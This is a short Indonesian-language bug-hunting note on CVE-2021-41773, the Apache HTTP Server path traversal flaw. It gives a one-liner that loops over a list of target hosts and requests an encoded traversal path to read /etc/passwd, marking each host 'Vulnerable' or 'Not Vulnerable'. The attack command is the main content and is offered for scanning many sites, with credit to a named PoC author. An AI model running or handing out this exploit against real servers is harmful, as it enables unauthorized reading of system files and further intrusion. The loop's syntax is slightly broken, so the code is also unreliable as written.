## Common Vulnerabilities and Exposures (CVE) 
* CVE adalah kerentanan yang sudah dipublikasikan dan sebagai bug hunter kita bisa menggunakannya untuk mencari web yang belum memperbaiki kerentanan tersebut

#### CVE 2021-41773

* Path Traversal Zero-Day pada Apache HTTP

One Liner:
* Masukkan daftar target ke file targets.txt dan lakukan scanning dengan command dibawah ini:
```
cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
```

POC dari Rohit Gautam cek twitternya di @HackerGautam
